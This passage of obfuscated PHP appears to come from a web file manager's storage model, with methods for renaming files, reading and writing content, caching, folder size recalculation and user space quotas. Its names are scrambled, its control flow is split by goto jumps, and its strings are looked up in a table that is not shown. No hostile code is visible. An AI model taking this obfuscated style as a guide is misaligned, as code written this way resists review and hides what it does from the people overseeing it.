$b„ÇŒÇ…‡‚[$dÌª˜ö¹»[472]]; if (isset(self::$cacheChildList[$BîªÌšçƒÌ])) { unset(self::$cacheChildList[$BîªÌšçƒÌ]); } return $b–ñÉ­¯÷‚; goto EÀÊ‰Ö—¦å; Cùò†ÛŞ®ö: $fÑìŠ¹Ï = $this->fileNameExist($b„ÇŒÇ…‡‚[$dÌª˜ö¹»[472]], $A¤Âç‡®Æ“); if ($fÑìŠ¹Ï && $fÑìŠ¹Ï != $dœï§Í·ÕÌ) { return !1; } $BÂ˜‹ÖŞĞ× = array($dÌª˜ö¹»[407] => $A¤Âç‡®Æ“, $dÌª˜ö¹»[547] => USER_ID); goto AÚ¯†¿Ê–; AÚ¯†¿Ê–: if (!$b„ÇŒÇ…‡‚[$dÌª˜ö¹»[397]] == $dÌª˜ö¹»[86]) { $BÂ˜‹ÖŞĞ×[$dÌª˜ö¹»[399]] = get_path_ext($A¤Âç‡®Æ“); } Model($dÌª˜ö¹»[528])->eventRename($dœï§Í·ÕÌ, $b„ÇŒÇ…‡‚[$dÌª˜ö¹»[28]], $A¤Âç‡®Æ“); $this->sourceCacheClear($dœï§Í·ÕÌ); goto Dã´í×‰†; Dã´í×‰†: $this->setNamePinyin($dœï§Í·ÕÌ, $BÂ˜‹ÖŞĞ×[$dÌª˜ö¹»[28]], !1); $this->updateModifyTime($b„ÇŒÇ…‡‚[$dÌª˜ö¹»[472]]); $b–ñÉ­¯÷‚ = $this->where(array($dÌª˜ö¹»[404] => $dœï§Í·ÕÌ))->data($BÂ˜‹ÖŞĞ×)->save(); goto aíÇ¼¹ã×Ö; CÇÜ‘ÇÀàÌ: $dÌª˜ö¹» =& $_SERVER[¹Ò‹Ò¹]; $b„ÇŒÇ…‡‚ = $this->sourceInfo($dœï§Í·ÕÌ); if (!$b„ÇŒÇ…‡‚) { return !1; } goto Cùò†ÛŞ®ö; EÀÊ‰Ö—¦å: } public function setNamePinyin($BÌ²ãŞ’îÄ, $aÑÃÍÅ½•„, $f—ˆÌŠÕĞ° = true) { $Cª´øíÀ£¿ =& $_SERVER[¹Ò‹Ò¹]; $Fäõ‘Œ‹Á = Input::check($aÑÃÍÅ½•„, $Cª´øíÀ£¿[551]); if ($f—ˆÌŠÕĞ° && !$Fäõ‘Œ‹Á) { return; } if (!$Fäõ‘Œ‹Á) { $this->metaSet($BÌ²ãŞ’îÄ, $Cª´øíÀ£¿[438], null); $this->metaSet($BÌ²ãŞ’îÄ, $Cª´øíÀ£¿[437], null); return; } $càßá™¦ù½ = array($Cª´øíÀ£¿[438] => str_replace($Cª´øíÀ£¿[50], $Cª´øíÀ£¿[33], Pinyin::encode($aÑÃÍÅ½•„)), $Cª´øíÀ£¿[437] => Pinyin::encode($aÑÃÍÅ½•„, $Cª´øíÀ£¿[552])); $this->metaSet($BÌ²ãŞ’îÄ, $càßá™¦ù½); } public function getContent($E‹¯ÖªÏ›) { goto f¡Á¿È†àŠ; D“›¿¡Û«Š: if ($F©œ‡‰éƒ¯[$F÷‹ñíáÂ×[77]] == 0) { return $F÷‹ñíáÂ×[33]; } $D°‰•©Œó¯ = $F÷‹ñíáÂ×[1953] . $F©œ‡‰éƒ¯[$F÷‹ñíáÂ×[169]]; if ($F©œ‡‰éƒ¯[$F÷‹ñíáÂ×[77]] <= 1024 * 10) { $EİÂé§Êë” = Cache::get($D°‰•©Œó¯); if (!$EİÂé§Êë”) { $EİÂé§Êë” = IO::getContent($F©œ‡‰éƒ¯[$F÷‹ñíáÂ×[75]]); Cache::set($D°‰•©Œó¯, $EİÂé§Êë”); } return $EİÂé§Êë”; } goto Cã‡Äº¶Ó·; Cã‡Äº¶Ó·: if (!$F©œ‡‰éƒ¯[$F÷‹ñíáÂ×[75]]) { return $F÷‹ñíáÂ×[33]; } return IO::getContent($F©œ‡‰éƒ¯[$F÷‹ñíáÂ×[75]]); goto B’÷ÃçÖ‰“; f¡Á¿È†àŠ: $F÷‹ñíáÂ× =& $_SERVER[¹Ò‹Ò¹]; $F©œ‡‰éƒ¯ = $this->fileInfoGet($E‹¯ÖªÏ›); if (!$F©œ‡‰éƒ¯) { return !1; } goto D“›¿¡Û«Š; B’÷ÃçÖ‰“: } public function setDesc($C´‡†£‡ƒ•, $CŠõÉ£Ú±ì) { $eÈ‚¶ÍĞ‰ =& $_SERVER[¹Ò‹Ò¹]; Model($eÈ‚¶ÍĞ‰[528])->eventAddDesc($C´‡†£‡ƒ•, $CŠõÉ£Ú±ì); return $this->metaSet($C´‡†£‡ƒ•, $eÈ‚¶ÍĞ‰[425], $CŠõÉ£Ú±ì); } public function setContent($fù¥—£˜ß¾, $cÅ¯¤ë»Š = '') { goto EÀ„šŒÅ†Š; C±æŸä®¥‰: if (!$d©´ÓâÌ) { return Model($Féí¤ÃèÎ»[444])->remove($CìƒÊ¤âİ[$Féí¤ÃèÎ»[441]]); } $this->folderSizeReset($d±ÒÜ£İì¢[$Féí¤ÃèÎ»[472]]); return !0; goto d¯ô’ô¶°Ä; EÀ„šŒÅ†Š: $Féí¤ÃèÎ» =& $_SERVER[¹Ò‹Ò¹]; $d±ÒÜ£İì¢ = $this->sourceInfo($fù¥—£˜ß¾); $D¸ÍÈ·‚ÀÔ = $this->fileInfoGet($fù¥—£˜ß¾); goto F¬É„¼¯ò³; F¬É„¼¯ò³: if (!$D¸ÍÈ·‚ÀÔ || !$d±ÒÜ£İì¢) { return !1; } $CìƒÊ¤âİ = Model($Féí¤ÃèÎ»[444])->addFileByContent($cÅ¯¤ë»Š, $d±ÒÜ£İì¢[$Féí¤ÃèÎ»[28]]); $d©´ÓâÌ = $this->fileHistory($d±ÒÜ£İì¢, $CìƒÊ¤âİ[$Féí¤ÃèÎ»[441]], $CìƒÊ¤âİ[$Féí¤ÃèÎ»[77]]); goto C±æŸä®¥‰; d¯ô’ô¶°Ä: } public function fileSubstr($C‹Ñóˆ™õ, $Eä²‘¨„ÈÈ, $fµø§ƒ¤) { $eßŸË¢íÓ¾ = $this->fileInfoGet($C‹Ñóˆ™õ); if (!$eßŸË¢íÓ¾) { return !1; } return IO::fileSubstr($eßŸË¢íÓ¾[$_SERVER[¹Ò‹Ò¹][75]], $Eä²‘¨„ÈÈ, $fµø§ƒ¤); } public function fileInfoGet($EŸËÖÙ–“») { goto b»®…î›ëì; dºİÒÉäö: return $b½ƒèŠÇçĞ; goto B¦İ‚‚´Ú†; F¤õ×·•ñê: $fÏß¸˜‡éµ = $cÏ…½ÀÊâ’[447] . $F´ëÚ‚ìÍº[$cÏ…½ÀÊâ’[441]]; $CéšòƒÌÀÆ = _get(self::$cacheFileInfo, $fÏß¸˜‡éµ); if ($CéšòƒÌÀÆ) { return $CéšòƒÌÀÆ; } goto A³—ğ²©±†; b»®…î›ëì: $cÏ…½ÀÊâ’ =& $_SERVER[¹Ò‹Ò¹]; $F´ëÚ‚ìÍº = $this->sourceInfo($EŸËÖÙ–“»); if (!$F´ëÚ‚ìÍº || $F´ëÚ‚ìÍº[$cÏ…½ÀÊâ’[397]]) { return !1; } goto F¤õ×·•ñê; A³—ğ²©±†: $b½ƒèŠÇçĞ = Model($cÏ…½ÀÊâ’[444])->fileInfo($F´ëÚ‚ìÍº[$cÏ…½ÀÊâ’[441]]); if ($b½ƒèŠÇçĞ) { $b½ƒèŠÇçĞ[$cÏ…½ÀÊâ’[28]] = $F´ëÚ‚ìÍº[$cÏ…½ÀÊâ’[28]]; } self::$cacheFileInfo[$fÏß¸˜‡éµ] = $b½ƒèŠÇçĞ; goto dºİÒÉäö; B¦İ‚‚´Ú†: } private function folderChildrenNumber($cî–éŞ¤”í) { $a‰Í«°ìó =& $_SERVER[¹Ò‹Ò¹]; $cŠã§õâ „ = $this->sourceInfo($cî–éŞ¤”í); $DÁØ¥°Ùï» = array($a‰Í«°ìó[548] => array($a‰Í«°ìó[507], $cŠã§õâ „[$a‰Í«°ìó[481]] . $cî–éŞ¤”í . $a‰Í«°ìó[508]), $a‰Í«°ìó[416] => intval($cŠã§õâ „[$a‰Í«°ìó[417]]), $a‰Í«°ìó[541] => 1); $AÍ‘ğ°íÈ = $this->where($DÁØ¥°Ùï»)->count(); $DîÉÑ„¯¶© = $this->where($DÁØ¥°Ùï»)->where(array($a‰Í«°ìó[541] => 0))->count(); return array($a‰Í«°ìó[81] => $DîÉÑ„¯¶©, $a‰Í«°ìó[82] => $AÍ‘ğ°íÈ); } public function pathInfo($E½Ÿ¡ˆÜ, $d‡¹„ à©‰ = false) { goto Fà¯°ß‡Ó; Fà¯°ß‡Ó: $Eê‚±»­†ä =& $_SERVER[¹Ò‹Ò¹]; $d‡¹„ à©‰ = !1; $E½Ÿ¡ˆÜ = intval($E½Ÿ¡ˆÜ); goto fãÅ äêÁ„; fãÅ äêÁ„: $aÙâæĞ¼¥¸ = $Eê‚±»­†ä[433] . intval($d‡¹„ à©‰) . $Eê‚±»­†ä[434] . $E½Ÿ¡ˆÜ; $BÙß˜ßøÃ = _get(self::$cachePathInfo, $aÙâæĞ¼¥¸); if ($BÙß˜ßøÃ) { return $BÙß˜ßøÃ; } goto fçùâÂè†­; fçùâÂè†­: $F‰Ñëéœ½¦ = $this->sourceInfo($E½Ÿ¡ˆÜ); if (!$F‰Ñëéœ½¦) { return !1; } $F‰Ñëéœ½¦ = $this->_listDataApplyItem($F‰Ñëéœ½¦, $d‡¹„ à©‰); goto D¶Œ—µ”‰; D¶Œ—µ”‰: self::$cachePathInfo[$aÙâæĞ¼¥¸] = $F‰Ñëéœ½¦; return $F‰Ñëéœ½¦; goto C­¯Šâƒó; C­¯Šâƒó: } public static $cachePathInfoMore = array(); public function pathInfoMore($Cªİ­ŸäŒÑ) { goto AèôÎ‚¯‡¥; AèôÎ‚¯‡¥: $aŒáô¹¸öË =& $_SERVER[¹Ò‹Ò¹]; $Aó…ÖÚÜñ = _get(self::$cachePathInfoMore, $Cªİ­ŸäŒÑ); if ($Aó…ÖÚÜñ) { return $Aó…ÖÚÜñ; } goto aŸè¡äÌ“; B‰•—ğÆ‚‚: self::$cachePathInfoMore[$Cªİ­ŸäŒÑ] = $F”™ÏŸÃÆ; return $F”™ÏŸÃÆ; goto eÕŠ¢‚æ; aŸè¡äÌ“: $F”™ÏŸÃÆ = $this->pathInfo($Cªİ­ŸäŒÑ); if (!$F”™ÏŸÃÆ) { return !1; } if ($F”™ÏŸÃÆ[$aŒáô¹¸öË[397]] == $aŒáô¹¸öË[86]) { $F”™ÏŸÃÆ[$aŒáô¹¸öË[80]] = $this->folderChildrenNumber($Cªİ­ŸäŒÑ); } goto B‰•—ğÆ‚‚; eÕŠ¢‚æ: } public function sourceInfo($FÙŞçÖµÃ) { goto fã“îÅñõõ; C×–š™âË: $f×¥ïéÆ = $this->where(array($Eª›çî‚¡à[390] => $FÙŞçÖµÃ))->find(); self::$cacheSourceInfo[$b¶– ¿˜ïÄ] = $f×¥ïéÆ; return self::$cacheSourceInfo[$b¶– ¿˜ïÄ]; goto f®ÕÆ½Î‰ø; fã“îÅñõõ: $Eª›çî‚¡à =& $_SERVER[¹Ò‹Ò¹]; if (!$FÙŞçÖµÃ) { return array(); } $FÙŞçÖµÃ = intval($FÙŞçÖµÃ); goto dã±¯Ö¶³; dã±¯Ö¶³: $b¶– ¿˜ïÄ = $Eª›çî‚¡à[432] . $FÙŞçÖµÃ; $eŞòÒ³ÇÙå = _get(self::$cacheSourceInfo, $b¶– ¿˜ïÄ); if ($eŞòÒ³ÇÙå) { return $eŞòÒ³ÇÙå; } goto C×–š™âË; f®ÕÆ½Î‰ø: } public function sourceCacheClear($Dä½Š­ì¾ = false) { self::cacheClear($Dä½Š­ì¾); } public static function cacheClear($B©Î‹Ú×Ê‹ = false) { $b½³÷‚–í =& $_SERVER[¹Ò‹Ò¹]; if ($B©Î‹Ú×Ê‹ == !1) { goto B¿‹ÒƒÆË×; Fºƒ››…˜ì: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto BÅÈÔ°¬¡Ô; BÅÈÔ°¬¡Ô: return; goto AËÂ‰Øë˜; B¿‹ÒƒÆË×: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto Fºƒ››…˜ì; AËÂ‰Øë˜: } unset(self::$cacheSourceInfo[$b½³÷‚–í[432] . $B©Î‹Ú×Ê‹]); unset(self::$cachePathInfoMore[$B©Î‹Ú×Ê‹]); unset(self::$cachePathInfo[$b½³÷‚–í[1954] . $B©Î‹Ú×Ê‹]); unset(self::$cachePathInfo[$b½³÷‚–í[1955] . $B©Î‹Ú×Ê‹]); } public function metaSet($Aí˜‚ƒ“À®, $FŸÊªöæÑ = null, $AëÔÃˆÛ³– = null) { $b°³ÕÖØ•» = parent::metaSet($Aí˜‚ƒ“À®, $FŸÊªöæÑ, $AëÔÃˆÛ³–); if ($b°³ÕÖØ•») { $this->sourceCacheClear($Aí˜‚ƒ“À®); } return $b°³ÕÖØ•»; } public function pathInfoByPath($CÂº˜øâÌ, $D»‡ª¼‹›) { $fÄ¥ÖùäËÆ =& $_SERVER[¹Ò‹Ò¹]; $b•·¾”ğğ¤ = !$D»‡ª¼‹› ? array() : explode($fÄ¥ÖùäËÆ[8], trim($D»‡ª¼‹›, $fÄ¥ÖùäËÆ[8])); $aŠ¦‰ƒÌø = $CÂº˜øâÌ; foreach ($b•·¾”ğğ¤ as $B®Íõ·‹åÙ) { $aÀµ’Ñª´• = array($fÄ¥ÖùäËÆ[472] => $aŠ¦‰ƒÌø, $fÄ¥ÖùäËÆ[28] => $B®Íõ·‹åÙ); $d‘Ë–øÂ¼  = $this->where($aÀµ’Ñª´•)->select(); if (!$d‘Ë–øÂ¼ ) { return !1; } $d‘Ë–øÂ¼  = array_sort_by($d‘Ë–øÂ¼ , $fÄ¥ÖùäËÆ[417]); $aŠ¦‰ƒÌø = $d‘Ë–øÂ¼ [0][$fÄ¥ÖùäËÆ[390]]; } return $this->pathInfo($aŠ¦‰ƒÌø, !0); } protected function updateModifyTime($d§ÓÌÈ·Œ) { goto AÕš£Ù§É; a”ÇâĞä¬Ğ: $this->where($aÍŒø˜¾†ù)->save($a´’¼ÚÙéÌ); goto AõË¨Êå¨†; AÕš£Ù§É: $e£ùÀë†Œ¯ =& $_SERVER[¹Ò‹Ò¹]; if (!$d§ÓÌÈ·Œ) { return; } if (!is_array($d§ÓÌÈ·Œ)) { $d§ÓÌÈ·Œ = array($d§ÓÌÈ·Œ); } goto e¸ÑæÃ¯†Ñ; e¸ÑæÃ¯†Ñ: foreach ($d§ÓÌÈ·Œ as $e¼Ááğ½ => $F´ÊÙäö¡ø) { $d§ÓÌÈ·Œ[$e¼Ááğ½] = intval($F´ÊÙäö¡ø); $this->sourceCacheClear($F´ÊÙäö¡ø); } $aÍŒø˜¾†ù = array($e£ùÀë†Œ¯[390] => array($e£ùÀë†Œ¯[7], $d§ÓÌÈ·Œ)); $a´’¼ÚÙéÌ = array($e£ùÀë†Œ¯[547] => USER_ID, $e£ùÀë†Œ¯[411] => time()); goto a”ÇâĞä¬Ğ; AõË¨Êå¨†: } public function folderSizeReset($C‰©ç“Á“Ä, $aˆĞ³×‘•ê = false) { goto B†ºª²ÁØ; bìÏÂá„Å : if ($aˆĞ³×‘•ê == 0) { return CacheLock::unlock($aË²ŒÆ‚¾ö); } $bù¡¶¦Ó¹ = $this->parentLevelArray($CòÇ‹öÇ½Ë[$F²¾„à’ŠÌ[481]]); if (!$bù¡¶¦Ó¹) { $bù¡¶¦Ó¹ = array(); } goto B‡ñøâ‚¡Ù; B†ºª²ÁØ: $F²¾„à’ŠÌ =& $_SERVER[¹Ò‹Ò¹]; if ($this->statusIgnoreResetSpace) { return; } $CòÇ‹öÇ½Ë = $this->sourceInfo($C‰©ç“Á“Ä); goto FƒØùéÀö¡; FƒØùéÀö¡: $aË²ŒÆ‚¾ö = $F²¾„à’ŠÌ[1956] . $C‰©ç“Á“Ä; CacheLock::lock($aË²ŒÆ‚¾ö, 20); if ($aˆĞ³×‘•ê === !1) { $this->sourceCacheClear($C‰©ç“Á“Ä); $CòÇ‹öÇ½Ë = $this->sourceInfo($C‰©ç“Á“Ä); $b‘ÖŠ†çáÎ = array($F²¾„à’ŠÌ[389] => $C‰©ç“Á“Ä, $F²¾„à’ŠÌ[416] => 0); $b¸Ç†Ê…Ì = $this->where($b‘ÖŠ†çáÎ)->sum($F²¾„à’ŠÌ[77]); $aˆĞ³×‘•ê = intval($b¸Ç†Ê…Ì) - intval($CòÇ‹öÇ½Ë[$F²¾„à’ŠÌ[77]]); } goto bìÏÂá„Å ; B‡ñøâ‚¡Ù: $bù¡¶¦Ó¹[] = $CòÇ‹öÇ½Ë[$F²¾„à’ŠÌ[390]]; $b‘ÖŠ†çáÎ = array($F²¾„à’ŠÌ[390] => array($F²¾„à’ŠÌ[405], $bù¡¶¦Ó¹)); if ($aˆĞ³×‘•ê < 0) { $b‘ÖŠ†çáÎ[$F²¾„à’ŠÌ[77]] = array($F²¾„à’ŠÌ[948], abs($aˆĞ³×‘•ê)); } goto E¤ÇÍÏ²Ñª; B„¾¹×·´Œ: $b×—‰ÖÜ ‹ = array($CòÇ‹öÇ½Ë[$F²¾„à’ŠÌ[398]], $CòÇ‹öÇ½Ë[$F²¾„à’ŠÌ[478]]); TaskRun::timeLimitCall($d‹Ñù›Œ§Š, $F²¾„à’ŠÌ[1958], $b×—‰ÖÜ ‹, 1.5); goto D‘ØÃ×”š; E¤ÇÍÏ²Ñª: $this->where($b‘ÖŠ†çáÎ)->setAdd($F²¾„à’ŠÌ[77], $aˆĞ³×‘•ê); CacheLock::unlock($aË²ŒÆ‚¾ö); $d‹Ñù›Œ§Š = $F²¾„à’ŠÌ[1957] . $CòÇ‹öÇ½Ë[$F²¾„à’ŠÌ[398]] . $F²¾„à’ŠÌ[4] . $CòÇ‹öÇ½Ë[$F²¾„à’ŠÌ[478]]; goto B„¾¹×·´Œ; D‘ØÃ×”š: } public function folderSizeResetChildren($cÏ¦é¥äİ) { goto Dª”öëÃ¢ø; EæÀÖ§ÁÖ: foreach ($aø«‚ˆ¥Û¤ as $d¶ÇÔŠ›“‚) { if ($d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[77]] == $d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[1960]]) { continue; } $Bêë¥ïíñã[] = array($Fµ©Èº÷÷‹[390], $d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[390]], $Fµ©Èº÷÷‹[77], $d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[77]]); } $this->saveAll($Bêë¥ïíñã); goto DïÍÈ”ÁÉ; EÎĞîà•˜‹: $bÒòíÍï·â[$Fµ©Èº÷÷‹[397]] = 0; $F ¾Ä×®Ôâ = $this->field($dÒß¿®Øª£)->where($bÒòíÍï·â)->select(); if (!$F ¾Ä×®Ôâ) { return; } goto a×ÁÉ Œù¯; a×ÁÉ Œù¯: $aø«‚ˆ¥Û¤[] = $C³¹«ÎÈÄ°; $aø«‚ˆ¥Û¤ = array_to_keyvalue($aø«‚ˆ¥Û¤, $Fµ©Èº÷÷‹[390]); foreach ($aø«‚ˆ¥Û¤ as $Eö‹²›‡øÓ => $d¶ÇÔŠ›“‚) { $aø«‚ˆ¥Û¤[$Eö‹²›‡øÓ][$Fµ©Èº÷÷‹[1960]] = $aø«‚ˆ¥Û¤[$Eö‹²›‡øÓ][$Fµ©Èº÷÷‹[77]]; $aø«‚ˆ¥Û¤[$Eö‹²›‡øÓ][$Fµ©Èº÷÷‹[77]] = 0; } goto FùäØò·; Dª”öëÃ¢ø: $Fµ©Èº÷÷‹ =& $_SERVER[¹Ò‹Ò¹]; $this->sourceCacheClear($cÏ¦é¥äİ); $C³¹«ÎÈÄ° = $this->sourceInfo($cÏ¦é¥äİ); goto a²¼¨Ô»‰; a²¼¨Ô»‰: $bÒòíÍï·â = array($Fµ©Èº÷÷‹[541] => 1, $Fµ©Èº÷÷‹[548] => array($Fµ©Èº÷÷‹[507], $C³¹«ÎÈÄ°[$Fµ©Èº÷÷‹[481]] . $cÏ¦é¥äİ . $Fµ©Èº÷÷‹[508])); $dÒß¿®Øª£ = $Fµ©Èº÷÷‹[1959]; $aø«‚ˆ¥Û¤ = $this->field($dÒß¿®Øª£)->where($bÒòíÍï·â)->select(); goto EÎĞîà•˜‹; FùäØò·: foreach ($F ¾Ä×®Ôâ as $d¶ÇÔŠ›“‚) { $E¯ˆñáÄàŸ = $d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[472]] . $Fµ©Èº÷÷‹[33]; if (!isset($aø«‚ˆ¥Û¤[$E¯ˆñáÄàŸ])) { continue; } if ($d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[417]] == $aø«‚ˆ¥Û¤[$E¯ˆñáÄàŸ][$Fµ©Èº÷÷‹[417]]) { $aø«‚ˆ¥Û¤[$E¯ˆñáÄàŸ][$Fµ©Èº÷÷‹[77]] += $d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[77]]; } } foreach ($aø«‚ˆ¥Û¤ as $d¶ÇÔŠ›“‚) { $FáŸ×³Óñ¨ = $this->parentLevelArray($d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[481]]); foreach ($FáŸ×³Óñ¨ as $E¯ˆñáÄàŸ) { $E¯ˆñáÄàŸ = $E¯ˆñáÄàŸ . $Fµ©Èº÷÷‹[33]; if (!isset($aø«‚ˆ¥Û¤[$E¯ˆñáÄàŸ])) { continue; } if ($d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[417]] == $aø«‚ˆ¥Û¤[$E¯ˆñáÄàŸ][$Fµ©Èº÷÷‹[417]]) { $aø«‚ˆ¥Û¤[$E¯ˆñáÄàŸ][$Fµ©Èº÷÷‹[77]] += $d¶ÇÔŠ›“‚[$Fµ©Èº÷÷‹[77]]; } } } $Bêë¥ïíñã = array(); goto EæÀÖ§ÁÖ; DïÍÈ”ÁÉ: } public function userSpaceReset($C¢ÙÏ¦Ç» = false) { $aÇ©†Š–°î =& $_SERVER[¹Ò‹Ò¹]; $A‹¿†¯°”¨ = $this->where(array($aÇ©†Š–°î[398] => self::TYPE_USER, $aÇ©†Š–°î[478] => $C¢ÙÏ¦Ç», $aÇ©†Š–°î[397] => 0))->sum($aÇ©†Š–°î[77]); $A‹¿†¯°”¨ = !$A‹¿†¯°”¨ || $A‹¿†¯°”¨ <= 0 ? 0 : $A‹¿†¯°”¨; Model($aÇ©†Š–°î[497])->userEdit($C¢ÙÏ¦Ç», array($aÇ©†Š–°î[1653] => $A‹¿†¯°”¨)); } public function targetSpaceUpdate($C“Ã«¶…§, $f×›Éè¼Êã) { $Bâ¸ÉÄÅ =& $_SERVER[¹Ò‹Ò¹]; if (!$f×›Éè¼Êã) { return; } if (!in_array($C“Ã«¶…§, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $D¿ÏªÜÔ§Ÿ = $this->targetSpaceSize($C“Ã«¶…§, $f×›Éè¼Êã); if ($C“Ã«¶…§ == self::TYPE_USER) { Model($Bâ¸ÉÄÅ[497])->userEdit($f×›Éè¼Êã, array($Bâ¸ÉÄÅ[1653] => $D¿ÏªÜÔ§Ÿ)); } else { if ($C“Ã«¶…§ == self::TYPE_GROUP) { Model($Bâ¸ÉÄÅ[480])->groupEdit($f×›Éè¼Êã, array($Bâ¸ÉÄÅ[1653] => $D¿ÏªÜÔ§Ÿ)); } } } public function targetSpaceSize($d×Å‘ƒˆ, $eß°×ŸêĞ§) { goto F”ä×Ìå™¾; F”ä×Ìå™¾: $fÊ¡¨ß¥À¤ =& $_SERVER[¹Ò‹Ò¹]; $e•õÓ¿İ™™ = $this->sourceRoot($d×Å‘ƒˆ, $eß°×ŸêĞ§, !0); if (!$e•õÓ¿İ™™) { return 0; } goto d‚ˆ©İŞ­×; d‚ˆ©İŞ­×: $dÔ¶Øå”¤ = floatval($e•õÓ¿İ™™[$fÊ¡¨ß¥À¤[77]]); $aêŒâ…æ¥Ò = array($fÊ¡¨ß¥À¤[548] => array($fÊ¡¨ß¥À¤[507], $fÊ¡¨ß¥À¤[493] . $e•õÓ¿İ™™[$fÊ¡¨ß¥À¤[390]] . $fÊ¡¨ß¥À¤[508])); $D‘Óôòòòƒ = Model($fÊ¡¨ß¥À¤[415])->field($fÊ¡¨ß¥À¤[404])->where($aêŒâ…æ¥Ò)->select(); goto fò’¿ÀØŠ; b»áøõâİ‘: $dÔ¶Øå”¤ = !$dÔ¶Øå”¤ || $dÔ¶Øå”¤ <= 0 ? 0 : $dÔ¶Øå”¤; return $dÔ¶Øå”¤; goto Eõº£æ˜Æ«; fò’¿ÀØŠ: $D‘Óôòòòƒ = array_to_keyvalue($D‘Óôòòòƒ, $fÊ¡¨ß¥À¤[33], $fÊ¡¨ß¥À¤[390]); $D‘Óôòòòƒ = array_unique(array_filter($D‘Óôòòòƒ)); if ($D‘Óôòòòƒ) { $aêŒâ…æ¥Ò = array($fÊ¡¨ß¥À¤[404] => array($fÊ¡¨ß¥À¤[405], $D‘Óôòòòƒ)); $dÔ¶Øå”¤ += floatval($this->where($aêŒâ…æ¥Ò)->sum($fÊ¡¨ß¥À¤[77])); } goto b»áøõâİ‘; Eõº£æ˜Æ«: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($AÍ­Á¿¬÷Õ) { return $this->fileTypeProfile($AÍ­Á¿¬÷Õ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($b¡ôÊÚ¦‹£) { return $this->fileTypeProfile($b¡ôÊÚ¦‹£, SourceModel::TYPE_GROUP); } private function fileTypeProfile($BÉ‡ÌÎÉ™, $fÖÙ‘µ™Š˜) { goto EÖ³¢É±‰Ò; EÖ³¢É±‰Ò: $Fã¤Ûäµ =& $_SERVER[¹Ò‹Ò¹]; $F¼³›×ª’ä = $Fã¤Ûäµ[1961] . $BÉ‡ÌÎÉ™ . $Fã¤Ûäµ[70] . $fÖÙ‘µ™Š˜; $c “È÷‹‡ = Cache::get($F¼³›×ª’ä); goto BåÎ¡Í±ö; e¥«ö’¿À‘: $BÉÄè¾éÎ§ = array(); $BÉÄè¾éÎ§[$Fã¤Ûäµ[1962]] = array($Fã¤Ûäµ[1963] => LNG($Fã¤Ûäµ[1962]), $Fã¤Ûäµ[1964] => $this->where($a‚œÜ»³ë)->count(), $Fã¤Ûäµ[543] => $this->where($a‚œÜ»³ë)->sum($Fã¤Ûäµ[77])); $dİƒÖ‰·Ÿ = KodIO::fileTypeList(); goto dºÖÃà‹´; BåÎ¡Í±ö: if ($c “È÷‹‡) { return $c “È÷‹‡; } $a‚œÜ»³ë = array($Fã¤Ûäµ[541] => 0); if ($BÉ‡ÌÎÉ™ != !1) { $a‚œÜ»³ë[$Fã¤Ûäµ[478]] = $BÉ‡ÌÎÉ™; $a‚œÜ»³ë[$Fã¤Ûäµ[398]] = $fÖÙ‘µ™Š˜; } goto e¥«ö’¿À‘; dºÖÃà‹´: foreach ($dİƒÖ‰·Ÿ as $FÊœÅ’Æ¢à => $f‡ëà»¬ÓÄ) { $a‚œÜ»³ë[$Fã¤Ûäµ[399]] = $this->fileTypeWhere($FÊœÅ’Æ¢à); $BÉÄè¾éÎ§[$FÊœÅ’Æ¢à] = array($Fã¤Ûäµ[1963] => $f‡ëà»¬ÓÄ[$Fã¤Ûäµ[28]], $Fã¤Ûäµ[1964] => $this->where($a‚œÜ»³ë)->count(), $Fã¤Ûäµ[543] => $this->where($a‚œÜ»³ë)->sum($Fã¤Ûäµ[77])); } Cache::set($F¼³›×ª’ä, $BÉÄè¾éÎ§, 1200); return $BÉÄè¾éÎ§; goto f˜ó™ìäğ·; f˜ó™ìäğ·: } public function fileNameExist($aÖª®‹ÇÄí, $EÕÅù¾Ï›•) { $aîòÖëäÇ =& $_SERVER[¹Ò‹Ò¹]; $CÙ°ˆ¶Ò‘Ñ = $this->childList($aÖª®‹ÇÄí); foreach ($CÙ°ˆ¶Ò‘Ñ as $b»š›ÆÓ–œ) { if ($b»š›ÆÓ–œ[$aîòÖëäÇ[28]] == $EÕÅù¾Ï›•) { return $b»š›ÆÓ–œ[$aîòÖëäÇ[390]]; } if (strtolower($b»š›ÆÓ–œ[$aîòÖëäÇ[28]]) == strtolower($EÕÅù¾Ï›•)) { return $b»š›ÆÓ–œ[$aîòÖëäÇ[390]]; } } return !1; } public function childList($E†¶ğŒÄ) { goto dÑ¤ßÆ¹‚; B»ƒâ×æÖò: $cÙîÌÚ¥Â™ = array($E³ÔôËƒ”í[472] => intval($E†¶ğŒÄ), $E³ÔôËƒ”í[417] => 0); $aÕè¢ÈÂø = $this->where($cÙîÌÚ¥Â™)->select(); $aÕè¢ÈÂø = $aÕè¢ÈÂø ? $aÕè¢ÈÂø : array(); goto C÷Â†ëñ‚’; C÷Â†ëñ‚’: self::$cacheChildList[$D‚ë¬‘Şì] = $aÕè¢ÈÂø; foreach ($aÕè¢ÈÂø as $B‘²ŞˆÖáÚ) { $D‚ë¬‘Şì = $E³ÔôËƒ”í[432] . $B‘²ŞˆÖáÚ[$E³ÔôËƒ”í[390]]; self::$cacheSourceInfo[$D‚ë¬‘Şì] = $B‘²ŞˆÖáÚ; } return $aÕè¢ÈÂø; goto b—¡¢åÕ‚; dÑ¤ßÆ¹‚: $E³ÔôËƒ”í =& $_SERVER[¹Ò‹Ò¹]; $D‚ë¬‘Şì = $E³ÔôËƒ”í[1939] . $E†¶ğŒÄ; if (isset(self::$cacheChildList[$D‚ë¬‘Şì])) { return self::$cacheChildList[$D‚ë¬‘Şì]; } goto B»ƒâ×æÖò; b—¡¢åÕ‚: } public function fileNameAuto($dİµóò›‡¹, $D×¹ÃŒí‘, 